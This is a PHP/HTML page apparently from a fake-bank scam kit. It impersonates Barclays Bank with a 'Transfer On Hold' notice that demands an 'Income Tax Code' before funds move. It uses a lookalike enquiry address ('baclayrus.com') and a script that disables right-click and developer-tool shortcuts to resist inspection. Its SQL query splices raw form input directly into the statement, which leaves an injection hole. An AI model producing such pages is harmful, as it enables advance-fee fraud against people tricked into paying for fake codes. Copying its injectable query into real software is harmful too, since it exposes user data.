<?php
session_start();
include 'connection.php';
if(isset($_SESSION['email']))
{
$email = $_SESSION['email'];	

if(isset($_POST['transfer_submit']))
{
	
	$inco = $_POST['inco'];
	$sql = "select * from frean WHERE inco = '$inco' AND email = '$email'";
	$row = $conn->query($sql);
	if($row->num_rows>0)
		header('Location:incometax-login.php');
	else
		$error_msg = "Invalid Income Tax Code";
}
}
else
	exit;

?>
<html>
<title>Barclays Bank-Income Tax</title>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <link rel="icon" type="png" href="image/logoshsbc.png" style="width:5%">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.1/css/all.css"
        integrity="sha384-gfdkjb5BdAXd+lj+gudLWI+BXq4IuLW5IT+brZEZsLFm++aCMlF1V92rMkPaX4PP" crossorigin="anonymous">
    <link rel="stylesheet" href="css/bootstrap.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Amaranth:ital@1&family=Asap+Condensed:ital@1&family=Barlow+Semi+Condensed:wght@300&family=Big+Shoulders+Display:wght@300&family=DM+Sans:ital,wght@1,500&family=Dosis:wght@300;500&family=EB+Garamond:ital@1&family=Economica&family=Fauna+One&family=Italianno&family=Niconne&family=Nobile:ital@1&family=Smooch+Sans&family=Thasadith:ital@1&family=Yanone+Kaffeesatz&display=swap"
        rel="stylesheet">
</head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.5/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>

<style>
.no-js #loader {
    display: none;
}

.js #loader {
    display: block;
    position: absolute;
    left: 100px;
    top: 0;
}

.se-pre-con {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url(image/loading-gif-animation.gif) center no-repeat #fff;
}
}

.timeline-wrapper {
    margin-left: 1.rem;
    border-left: 4px solid #ddd;
}

.node {
    padding-left: 1.2rem;
    padding-bottom: 1.8rem;
    position: relative;

}

.node h3,
.node p {
    margin: 0;
}

.node::before {
    content: "";
    width: .8rem;
    height: .8rem;
    background: green;
    border: 1px solid #ccc;
    border-radius: 50%;
    position: absolute;
    top: .3rem;
    left: -.5rem;
}

.table {
    width: 80%;
    margin: auto;
    background: #4040bf;
    border: 2px solid green;
}

th {
    text-align: center;
    color: #fff;
}

.br {
    border: 0.7px solid black;
    width: 100%;
    display: block;
    color: #fff;
    padding: 3px;
}


.bor {
    border: 2px solid black;
}

.header {
    width: 100%;
    height: 80px;
    background: lightgray;
}

* {
    margin: 0;
    box-sizing: border-box;
}

body {
    font-family: "Lato", sans-serif;
}

.table {
    width: 80%;
    margin: auto;
    background: orange;
    border: 2px solid green;
}

th {
    text-align: center;
    color: #fff;
}

.br {
    border: 0.7px solid black;
    width: 100%;
    display: block;
    color: #fff;
    padding: 3px;
}

.bor {
    border: 1px solid black;
}


.blinking {
    animation: blinkingText 1.2s infinite;
    color: #ff3300;
}

@keyframes blinkingText {
    0% {
        color: #000;
    }

    49% {
        color: #000;
    }

    60% {
        color: transparent;
    }

    99% {
        color: transparent;
    }

    100% {
        color: #000;
    }

}
</style>

<body>
<script>
$(window).load(function() {
    // Animate loader off screen
    $(".se-pre-con").fadeOut("slow");
});
</script>
<div class="se-pre-con no-js">
</div>

<section style="background-color:#c2c2a3">
        <div class="container">
            <div class="row">
                <div class="col-md-2">
                    <div style="height:5px"></div>
                    <div style="height:55px;background-color:#000066;border:1px solid #000066;width:200px;">
                        <p style="text-align:center;padding-top:10px;"><img src="Image/barclays-log.png"
                                style="width:190px;height:30px;"></p>
                    </div>
                </div>
                <div class="col-md-8">
                    <p
                        style="font-size:35px;font-family: 'Smooch Sans', sans-serif;color:#000066;text-align:center;padding-top:5px;">
                        Welcome To The Barclays Bank One Technology</p>
                </div>
                <div class="col-md-2" style="margin-top:20px;">
                                       
   <div id="google_translate_element" style="background-color:#000000;opacity:0.6;width:200px;"></div>
    <script type="text/javascript">
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({ pageLanguage: 'en', includedLanguages: 'zh-CN,cs,da,nl,en,et,fr,vi,hi' }, 'google_translate_element');
        }

    </script>

    <script type="text/javascript"
        src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
                </div>
            </div>
            <div>
    </section>
    <div style="height:50px"></div>

<div id="Sign In" align="center">
    <div
        style="background-color:#5c5c3d;width:300px;height:50px;border:2px solid #5c8a8a;text-align:center;color:#ffffff;font-size:30px;font-family: 'Source Sans Pro', sans-serif;">
        Device Information
    </div>
</div>

<div style="height:40px"></div>
<div id="Sign In" align="center">
    <div class="container">
        <div class="row">
            <div class="col-md-1">
            </div>
            <div class="col-md-10">
                <p style="font-size:25px;font-family: 'Smooch Sans', sans-serif;">
                <?php  echo 'Your IP Address is - '.$_SERVER['REMOTE_ADDR'];?> <span
                        style="font-size:25px;font-family: 'Smooch Sans', sans-serif;">Time: </span><span
                        id="rest" style="font-size:25px;font-family: 'Smooch Sans', sans-serif;"></span></p>
                <script>
                var europeTime = new Date().toLocaleString("en-US", {
                    timeZone: "Europe/London"
                });
                europeTime = new Date(europeTime);
                console.log('Europe time: ' + europeTime.toLocaleString())
                document.getElementById('rest').innerHTML = europeTime.toLocaleString();
                </script>
            </div>
            <div class="col-md-1">
            </div>
        </div>
    </div>
</div>
    <div style="height:60px"></div>
    <div class="container">
        <div class="row">
            <div class="col-md-12 justify-content-right">
                <div id="Sign In" align="center">
                    <div style="width:600px;border:3px solid #ebebe0; background-color:white;margin:auto;padding:5px;border-radius:20px;">
                        <br><br>
                        <span class="blinking"><span style="font-size:30px;font-family: 'Smooch Sans', sans-serif;">Transfer On
                                    Hold!!<br> Contact Your Account Officer!!</br></span></span><br>
                        <p class="glow"><span style="font-family: 'Nobile', sans-serif;font-size:35px;">Income Tax Code Is Required!!:</span></p>

                        <span style="font-family: 'Smooch Sans', sans-serif; font-size:25px">You are required to request for Income Tax Code </span><br>
                        <form action="" method="POST">
                            <?=@$error_msg?>
                            <p style="color:#66a3ff"><span style="font-family: 'Smooch Sans', sans-serif;font-size:35px;">Login
                            Income Tax Code  :</span></p>
                            <span style="font-family: 'Smooch Sans', sans-serif;font-size:25px;"> Income Tax Code  : </span><input
                                type="text" name="inco" id="pass" /><br><br>
                            <input name="transfer_submit" value="Proceed To Transfer"
                                onclick='javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions("ctl00$ContentPlaceHolder1$SUBMIT", "", true, "chk", "", false, false))'
                                id="ctl00_ContentPlaceHolder1=SUBMIT" class="btn btn-block bg-default btn-flat "
                                style="width:250px; color:#fff; font-size:25px; margin-bottom:30px; background:#D4090C;font-family: 'Smooch Sans', sans-serif; "
                                type="Submit">
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="Sign In" align="center">
        <div style="height:30px;"></div>
        <div style="background-color:#ffffff;width:700px;height:150px;"><img
                src="image/StopWastingMoney_Pic2_850x400_Anime.gif" width="200" height:"100"></div>
                <div style="height:30px;"></div>
        <div id="Sign In" align="center">
            <div style="background-color:#ffc266;width:700px;height:3px;"></div>
            <span
                style="font-size:25px;color:#000000;padding-bottom:60px;float:center;font-family: 'Smooch Sans', sans-serif;">
                This is under the Barclays
                Bank.| &#169 All Rights Reserved 2019. | For enquiries: enquirydept@baclayrus.com </span>

</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script>
document.addEventListener('contextmenu', event => event.preventDefault());

$(document).keydown(function(event) {
    if (event.keyCode == 123) { // Prevent F12
        return false;
    } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
        return false;
    }
});
</script>

</html>